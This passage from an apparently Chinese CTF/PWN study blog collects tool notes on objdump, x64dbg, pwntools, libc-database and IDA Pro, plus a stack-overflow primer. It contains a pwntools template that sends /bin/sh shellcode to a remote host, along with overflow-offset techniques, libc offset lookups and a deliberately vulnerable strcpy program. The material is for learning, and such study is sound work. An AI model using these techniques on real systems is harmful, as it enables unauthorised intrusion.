class="line">0000000000600e20 l    d  .jcr   0000000000000000              .jcr</span><br><span class="line">0000000000600e28 l    d  .dynamic       0000000000000000              .dynamic</span><br><span class="line">0000000000600ff8 l    d  .got   0000000000000000              .got</span><br><span class="line">0000000000601000 l    d  .got.plt       0000000000000000              .got.plt</span><br><span class="line">0000000000601028 l    d  .data  0000000000000000              .data</span><br><span class="line">000000000060102c l    d  .bss   0000000000000000              .bss</span><br><span class="line">0000000000000000 l    d  .comment       0000000000000000              .comment</span><br><span class="line">0000000000000000 l    <span class="built_in">df</span> *ABS*  0000000000000000              crtstuff.c</span><br><span class="line">0000000000600e20 l     O .jcr   0000000000000000              __JCR_LIST__</span><br><span class="line">0000000000400460 l     F .text  0000000000000000              deregister_tm_clones</span><br><span class="line">0000000000400490 l     F .text  0000000000000000              register_tm_clones</span><br><span class="line">00000000004004d0 l     F .text  0000000000000000              __do_global_dtors_aux</span><br><span class="line">000000000060102c l     O .bss   0000000000000001              completed.6355</span><br><span class="line">0000000000600e18 l     O .fini_array    0000000000000000              __do_global_dtors_aux_fini_array_entry</span><br><span class="line">00000000004004f0 l     F .text  0000000000000000              frame_dummy</span><br><span class="line">0000000000600e10 l     O .init_array    0000000000000000              __frame_dummy_init_array_entry</span><br><span class="line">0000000000000000 l    <span class="built_in">df</span> *ABS*  0000000000000000              test.c</span><br><span class="line">0000000000000000 l    <span class="built_in">df</span> *ABS*  0000000000000000              crtstuff.c</span><br><span class="line">00000000004007f0 l     O .eh_frame      0000000000000000              __FRAME_END__</span><br><span class="line">0000000000600e20 l     O .jcr   0000000000000000              __JCR_END__</span><br><span class="line">0000000000000000 l    <span class="built_in">df</span> *ABS*  0000000000000000</span><br><span class="line">0000000000600e18 l       .init_array    0000000000000000              __init_array_end</span><br><span class="line">0000000000600e28 l     O .dynamic       0000000000000000              _DYNAMIC</span><br><span class="line">0000000000600e10 l       .init_array    0000000000000000              __init_array_start</span><br><span class="line">0000000000400678 l       .eh_frame_hdr  0000000000000000              __GNU_EH_FRAME_HDR</span><br><span class="line">0000000000601000 l     O .got.plt       0000000000000000              _GLOBAL_OFFSET_TABLE_</span><br><span class="line">0000000000400630 g     F .text  0000000000000002              __libc_csu_fini</span><br><span class="line">0000000000601028  w      .data  0000000000000000              data_start</span><br><span class="line">000000000040051d g     F .text  0000000000000014              add</span><br><span class="line">000000000060102c g       .data  0000000000000000              _edata</span><br><span class="line">0000000000400634 g     F .fini  0000000000000000              _fini</span><br><span class="line">0000000000000000       F *UND*  0000000000000000              <span class="built_in">printf</span>@@GLIBC_2.2.5</span><br><span class="line">0000000000000000       F *UND*  0000000000000000              __libc_start_main@@GLIBC_2.2.5</span><br><span class="line">0000000000601028 g       .data  0000000000000000              __data_start</span><br><span class="line">0000000000000000  w      *UND*  0000000000000000              __gmon_start__</span><br><span class="line">0000000000400648 g     O .rodata        0000000000000000              .hidden __dso_handle</span><br><span class="line">0000000000400640 g     O .rodata        0000000000000004              _IO_stdin_used</span><br><span class="line">00000000004005c0 g     F .text  0000000000000065              __libc_csu_init</span><br><span class="line">0000000000601030 g       .bss   0000000000000000              _end</span><br><span class="line">0000000000400430 g     F .text  0000000000000000              _start</span><br><span class="line">000000000060102c g       .bss   0000000000000000              __bss_start</span><br><span class="line">0000000000400547 g     F .text  0000000000000070              main</span><br><span class="line">0000000000601030 g     O .data  0000000000000000              .hidden __TMC_END__</span><br><span class="line">0000000000400531 g     F .text  0000000000000016              sub</span><br><span class="line">00000000004003c8 g     F .init  0000000000000000              _init</span><br></pre></td></tr></table></figure></p><h3 id="5-查看-o文件的信息"><a href="#5-查看-o文件的信息" class="headerlink" title="5.查看.o文件的信息"></a>5.查看.o文件的信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -h test.o</span><br></pre></td></tr></table></figure><p>![[Pasted image 20250124143403.png]]<br>接着可以用nm查看函数和全局变量，静态变量<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost <span class="built_in">test</span>]<span class="comment"># nm test.o</span></span><br><span class="line">0000000000000000 T add</span><br><span class="line">000000000000002a T main</span><br><span class="line">                 U <span class="built_in">printf</span></span><br><span class="line">0000000000000014 T sub</span><br></pre></td></tr></table></figure><br>局部变量不会生成符号，最终是分配在栈内存中，<strong>不会在函数外部被引用</strong></p>]]></content>
      
      
      <categories>
          
          <category> 解题工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 解题工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具篇·x64dbg</title>
      <link href="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7x64dbg/"/>
      <url>/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7x64dbg/</url>
      
        <content type="html"><![CDATA[<h2 id="x64dbg"><a href="#x64dbg" class="headerlink" title="x64dbg"></a>x64dbg</h2><ul><li>搜索字符串<br><img src="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7x64dbg/Pasted image 20250121153435.png" alt="Pasted image 20250121153435"></li><li><code>F7</code>单步步入（进函数）</li><li><code>F8</code>单步步过</li><li>内存窗口中转到地址<br><img src="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7x64dbg/Pasted image 20250121153320.png" alt="Pasted image 20250121153320"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 解题工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 解题工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具篇·pwntools</title>
      <link href="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7pwntools/"/>
      <url>/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7pwntools/</url>
      
        <content type="html"><![CDATA[<h1 id="大致框架"><a href="#大致框架" class="headerlink" title="大致框架"></a>大致框架</h1><h3 id="简例"><a href="#简例" class="headerlink" title="简例"></a>简例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#简单样例</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;exploitme.example.com&#x27;</span>, <span class="number">31337</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">###### EXPLOIT CODE IS HERE</span></span><br><span class="line"></span><br><span class="line">r.send(asm(shellcraft.sh()))  </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment">#用来导入pwntools模块</span></span><br><span class="line">----</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>) <span class="comment">#设置目标机的信息</span></span><br><span class="line">----</span><br><span class="line">r = remote(<span class="string">&#x27;exploitme.example.com&#x27;</span>, <span class="number">31337</span>) <span class="comment">#用来建立一个远程连接，url或者ip作为地址，然后指明端口</span></span><br><span class="line">r = process(<span class="string">&quot;./test&quot;</span>) <span class="comment">#这里也可以仅仅使用本地文件,调试时方便，test即为文件名,这使得改变远程和本地十分方便.</span></span><br><span class="line">----</span><br><span class="line">asm(shellcraft.sh()) <span class="comment">#asm()函数接收一个字符串作为参数，得到汇编码的机器代码。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">&#x27;mov eax, 0&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;\xb8\x00\x00\x00\x00&#x27;</span></span><br><span class="line">----</span><br><span class="line">shellcraft模块是shellcode的模块，包含一些生成shellcode的函数。</span><br><span class="line">其中的子模块声明架构，比如shellcraft.arm 是ARM架构的，shellcraft.amd64是AMD64架构，shellcraft.i386是Intel <span class="number">80386</span>架构的，以及有一个shellcraft.common是所有架构通用的。</span><br><span class="line">而这里的shellcraft.sh()则是执行/<span class="built_in">bin</span>/sh的shellcode了</span><br><span class="line">----</span><br><span class="line">r.send() <span class="comment">#将shellcode发送到远程连接</span></span><br><span class="line">----</span><br><span class="line">r.interactive() <span class="comment">#将控制权交给用户，这样就可以使用打开的shell了</span></span><br></pre></td></tr></table></figure><h1 id="Context设置"><a href="#Context设置" class="headerlink" title="Context设置"></a>Context设置</h1><p><code>context</code>是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p><p>一般来说我们设置context只需要简单的一句话:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这句话的意思是：</span></span><br><span class="line"><span class="string">1. os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux  </span></span><br><span class="line"><span class="string">2. arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’  </span></span><br><span class="line"><span class="string">3. log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p><h1 id="数据打包"><a href="#数据打包" class="headerlink" title="数据打包"></a>数据打包</h1><p>数据打包,即将整数值转换为32位或者64位地址一样的表示方式,比如0x400010表示为\x10\x00\x40一样,这使得我们构造payload变得很方便</p><p>用法:  </p><ul><li><code>p32/p64</code>: 打包一个整数,分别打包为32或64位  </li><li><code>u32/u64</code>: 解包一个字符串,得到整数</li></ul><p>p对应pack,打包,u对应unpack,解包,简单好记</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(<span class="number">0xdeadbeef</span>) <span class="comment"># pack 32 bits number</span></span><br></pre></td></tr></table></figure><h1 id="数据输出"><a href="#数据输出" class="headerlink" title="数据输出"></a>数据输出</h1><p>如果需要输出一些信息,最好使用pwntools自带的,因为和pwntools本来的格式吻合,看起来也比较舒服,用法:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">some_str = <span class="string">&quot;hello, world&quot;</span></span><br><span class="line">log.info(some_str)</span><br></pre></td></tr></table></figure></p><blockquote><p>其中的info代表是log等级，也可以使用其他log等级。</p></blockquote><h1 id="Cyclic-pattern"><a href="#Cyclic-pattern" class="headerlink" title="Cyclic pattern"></a>Cyclic pattern</h1><p>Cyclic pattern是一个很强大的功能，大概意思就是，使用pwntools生成一个pattern，pattern就是指一个字符串，可以通过其中的一部分数据去定位到他在一个字符串中的位置。<br>在我们完成栈溢出题目的时候，使用pattern可以大大的减少计算溢出点的时间。<br>用法：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cyclic(<span class="number">0x100</span>) <span class="comment"># 生成一个0x100大小的pattern，即一个特殊的字符串</span></span><br><span class="line">cyclic_find(<span class="number">0x61616161</span>) <span class="comment"># 找到该数据在pattern中的位置</span></span><br><span class="line">cyclic_find(<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 查找位置也可以使用字符串去定位</span></span><br></pre></td></tr></table></figure><br>比如，我们在栈溢出的时候，首先构造<code>cyclic(0x100)</code>，或者更长长度的pattern，进行输入，输入后pc的值变味了0x61616161，那么我们通过<code>cyclic_find(0x61616161)</code>就可以得到从哪一个字节开始会控制PC寄存器了，避免了很多没必要的计算。</p><h1 id="汇编与shellcode"><a href="#汇编与shellcode" class="headerlink" title="汇编与shellcode"></a>汇编与shellcode</h1><p>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode。shellcraft : shellcode的生成器。即调用<code>/bin/sh</code>可以通过shellcraft得到：<br>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context，如果没声明平则<br><code>32位:shellcraft.i386.linux.sh()</code><br><code>64位:shellcraft.amd64.linux.sh()</code><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(shellcraft.sh()) <span class="comment"># 打印出shellcode</span></span><br></pre></td></tr></table></figure><br>不过，现在我们看到的shellcode还是汇编代码，不是能用的机器码，所以还需要进行一次汇编<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(asm(shellcraft.sh())) <span class="comment"># 打印出汇编后的shellcode</span></span><br></pre></td></tr></table></figure><br>asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。如果需要更复杂一些的汇编功能，可以使用<code>keystone-engine</code>项目，这里就不再赘述了。<br>asm也是架构相关，所以一定要先设置context，避免一些意想不到的错误。</p><h1 id="ELF文件操作"><a href="#ELF文件操作" class="headerlink" title="ELF文件操作"></a>ELF文件操作</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: elf = ELF(<span class="string">&#x27;./level0&#x27;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/nuo/level0&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: callsys_addr = elf.symbols[<span class="string">&#x27;callsystem&#x27;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="built_in">print</span> callsys_addr</span><br><span class="line"><span class="number">4195734</span></span><br><span class="line">In [<span class="number">6</span>]: a=<span class="built_in">hex</span>(callsys_addr)</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: <span class="built_in">print</span> a</span><br><span class="line"><span class="number">0x400596</span></span><br></pre></td></tr></table></figure><p>可见ipython时，ELF相当于checksec ,但其主要是获取信息，一些地址等<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">&#x27;/bin/cat&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.address)  <span class="comment"># 文件装载的基地址</span></span><br><span class="line"><span class="number">0x400000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.symbols[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># 函数地址,symbols,got,plt均是列表</span></span><br><span class="line"><span class="number">0x401680</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.got[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># GOT表的地址</span></span><br><span class="line"><span class="number">0x60b070</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.plt[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># PLT的地址</span></span><br><span class="line"><span class="number">0x401680</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>())<span class="comment"># 字符串/bin/sh的地址字符串加（）</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 解题工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 解题工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN入门-栈溢出</title>
      <link href="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="缓冲区溢出之栈溢出（strcpy）"><a href="#缓冲区溢出之栈溢出（strcpy）" class="headerlink" title="缓冲区溢出之栈溢出（strcpy）"></a>缓冲区溢出之栈溢出（strcpy）</h1><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><h3 id="缓冲区溢出简单介绍"><a href="#缓冲区溢出简单介绍" class="headerlink" title="缓冲区溢出简单介绍"></a>缓冲区溢出简单介绍</h3><p>缓冲区溢出：简单的说，缓冲区溢出就是超长的数据向小缓冲区复制，导致数据超出了小缓冲区，导致缓冲区其他的数据遭到破坏，这就是缓冲区溢出。<em>而栈溢出是缓冲区溢出的一种</em>，也是最常见的。只不过栈溢出发生在栈，堆溢出发生在堆，其实都是一样的。</p><h3 id="栈的简单介绍"><a href="#栈的简单介绍" class="headerlink" title="栈的简单介绍"></a>栈的简单介绍</h3><p>栈是一种计算机系统中的数据结构，它按照先进后出的原则存储数据，先进入的数据被压入栈底，最后的数据在栈顶，需要读数据的时候从栈顶开始弹出数据（最后一个数据被第一个读出来），是一种特殊的线性表。栈的操作常用的有进栈（PUSH），出栈（POP），还有常用的标识栈顶和栈底。</p><ul><li><strong>进栈</strong>（PUSH）：将一个数据放入栈里叫进栈（PUSH）</li><li><strong>出栈</strong>（POP）：将一个数据从栈里取出叫出栈（POP）</li><li><strong>栈顶</strong>：常用寄存器ESP，ESP是栈指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</li><li><strong>栈底</strong>：常用寄存器EBP，EBP是基址指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。<br><img src="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/Pasted image 20250121143258.png" alt="Pasted image 20250121143258"><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2></li></ul><p><strong>源代码：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;12345&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> *password)</span>&#123;</span><br><span class="line">    <span class="type">int</span> ret_num;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    ret_num=<span class="built_in">strcmp</span>(password,PASSWORD);<span class="comment">//相同返回0</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,password);</span><br><span class="line">    <span class="keyword">return</span> ret_num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">88</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;plz input your password:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">        flag=test(password);</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;Success!You are right!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="分析exe文件"><a href="#分析exe文件" class="headerlink" title="分析exe文件"></a>分析exe文件</h4><p>搜索字符串<code>plz input your password</code>,并在scanf处下断点<br><img src="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/Pasted image 20250121150226.png" alt="Pasted image 20250121150226"></p><p><img src="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/Pasted image 20250121151019.png" alt="Pasted image 20250121151019"><br><em>0C-04=8个字节</em></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具篇·libc-database</title>
      <link href="/2025/02/03/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7libc-database/"/>
      <url>/2025/02/03/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7libc-database/</url>
      
        <content type="html"><![CDATA[<p><a href="https://libc.rip/">libc-database在线网址</a></p><p>运行如下命令下载libc符号表与偏移文件。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./get  <span class="comment"># List categories</span></span><br><span class="line">$ ./get ubuntu debian  <span class="comment"># Download Ubuntu&#x27;s and Debian&#x27;s libc, old default behavior</span></span><br><span class="line">$ ./get all  <span class="comment"># Download all categories. Can take a while!</span></span><br></pre></td></tr></table></figure></p><p>将自定义的 libc 添加到你的数据库中。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./add /usr/lib/libc-2.21.so</span></span><br></pre></td></tr></table></figure></p><p>在数据库中查找所有具有给定名称和地址的 libc。只检查最后 12 位，因为随机化通常在页面大小级别上工作。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./find <span class="built_in">printf</span> 260 puts f30</span></span><br><span class="line">archive-glibc (libc6_2.19-10ubuntu2_i386)</span><br></pre></td></tr></table></figure></p><p>从泄漏的返回地址中查找 libc<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./find __libc_start_main_ret a83</span></span><br><span class="line">ubuntu-trusty-i386-libc6 (libc6_2.19-0ubuntu6.6_i386)</span><br><span class="line">archive-eglibc (libc6_2.19-0ubuntu6_i386)</span><br><span class="line">ubuntu-utopic-i386-libc6 (libc6_2.19-10ubuntu2.3_i386)</span><br><span class="line">archive-glibc (libc6_2.19-10ubuntu2_i386)</span><br><span class="line">archive-glibc (libc6_2.19-15ubuntu2_i386)</span><br></pre></td></tr></table></figure></p><p>根据 libc ID 提取一些有用的偏移量<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./dump libc6_2.19-0ubuntu6.6_i386</span></span><br><span class="line">offset___libc_start_main_ret = 0x19a83</span><br><span class="line">offset_system = 0x00040190</span><br><span class="line">offset_dup2 = 0x000db590</span><br><span class="line">offset_recv = 0x000ed2d0</span><br><span class="line">offset_str_bin_sh = 0x160a24</span><br></pre></td></tr></table></figure></p><p>检查一个库是否已经在数据库中。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./identify /usr/lib/libc.so.6</span></span><br><span class="line">local-f706181f06104ef6c7008c066290ea47aa4a82c5</span><br></pre></td></tr></table></figure></p><p>或者使用哈希值（目前实现了 BuildID、MD5、SHA1 和 SHA256）查找 libc：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./identify bid=ebeabf5f7039f53748e996fc976b4da2d486a626</span></span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./identify md5=af7c40da33c685d67cdb166bd6ab7ac0</span></span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./identify sha1=9054f5cb7969056b6816b1e2572f2506370940c4</span></span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./identify sha256=8dc102c06c50512d1e5142ce93a6faf4ec8b6f5d9e33d2e1b45311aef683d9b2</span></span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br></pre></td></tr></table></figure></p><p>下载与 libc ID 对应的整个库。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./download libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line">Getting libc6_2.23-0ubuntu10_amd64</span><br><span class="line">    -&gt; Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb</span><br><span class="line">    -&gt; Downloading package</span><br><span class="line">    -&gt; Extracting package</span><br><span class="line">    -&gt; Package saved to libs/libc6_2.23-0ubuntu10_amd64</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> libs/libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line">ld-2.23.so ... libc.so.6 ... libpthread.so.0 ...</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 解题工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 解题工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具篇·IDA_Pro</title>
      <link href="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/"/>
      <url>/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>笔者曾经用过 <code>7.7（继承了来自学长55桑的诸多插件）</code> 与 <code>8.3</code>，但都只是草草用过，近日沉迷于pwn之乐趣，使用频率大大增加，恰巧自己新提了全新款<code>IDA Pro 9.0 SP1</code>(似乎是首个不用使用者自己判断32位/64位的版本)，深入了解后也被IDA的强大功能折服。<br>遂从零开始记录<strong>使用笔记</strong></p><h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><p><code>空格键</code>： 切换 <strong>文本视图</strong> 与 <strong>图表视图</strong><br><code>ESC</code>： 返回上一个操作地址。（只有在反汇编窗口才是这个作用，如果是在其他窗口按下esc，会关闭该窗口）<br><code>G</code>： 直接跳转到某个地址<br><code>N</code>： 对符号重命名 Y： 更改变量的类型<br><code>H</code>： 转换16进制<br><code>T</code>： 解析结构体偏移 M： 转换为枚举类型常量<br><code>冒号键</code>： 常规注释<br><code>分号键</code>： 可重复注释。在反汇编后的界面中写下注释<br><code>/</code> ： 在反编译后伪代码的界面中写下注释<br><code>\</code>： 在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多<br><code>Alt+M</code>： 添加 标签<br><code>Ctrl+M</code>： 查看 标签<br><code>ctrl+w</code>： 保存 ida 数据库<br><code>ctrl+shift+w</code>：拍摄 IDA 快照<br><code>Ctrl+S</code>： 查看 段信息。选择某个数据段，直接进行跳转<br><code>ctrl+鼠标滚轮</code>：能够调节流程视图的大小<br><code>shift+f12</code>：可以打开 string 窗口，一键找出所有的字符串。<br><code>X ( ctrl+X )</code>： 对着某个函数、变量按该快捷键，可以查看它的交叉引用。<br><code>F5</code>： 查看 伪代码，即 一键反汇编<br><code>Shift +F5</code>：打开签名窗口<br><code>ALT+L</code>：标记(Lable)<br><code>ALT+G</code>：转换局部变量为结构体 ALT+Enter：跳转到新的窗口<br><code>Alt+T</code>： 文本搜索<br><code>Alt+B</code>： 二进制搜索<br><code>shift + f7</code> 显示段窗口  </p><p>Hex View 窗口</p><p>显示16进制，默认为只读状态，可以用快捷键<code>F2</code>对数据区域（绿色字符区域）在只读和编辑两种状态切换。</p><p><img src="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/image-20250327203731853.png" alt="image-20250327203731853"></p><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h3><p>在操作IDA的时候，经常会遇到需要创建数组的情况，尤其是为了能方便我们看字符串的时候，创建数组显得非常必要，以下我随便找了个数据来创建数组</p><p>首先点击选中你想要转换成数组的一块区域：</p><p><img src="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/image-20250327204318565.png" alt="image-20250327204318565"></p><ul><li><code>Array element size</code> 这个值表示各数组元素的大小（这里是1个字节），是根据你选中的数据值的大小所决定的</li><li><code>Array size</code> 表示数组元素的数量，一般都根据你选定的自动产生默认值</li><li><code>Items on a line</code> 这个表示指定每个反汇编行显示的元素数量，它可以减少显示数组所需的空间</li><li><code>Element print width</code> 这个值用于格式化，当一行显示多个项目时，他控制列宽</li><li><code>Use “dup” construct</code> ：使用重复结构，这个选项可以使得相同的数据值合并起来，用一个重复说明符组合成一项</li><li><code>Signed elements</code> 表示将数据显示为有符号数还是无符号数</li><li><code>Display 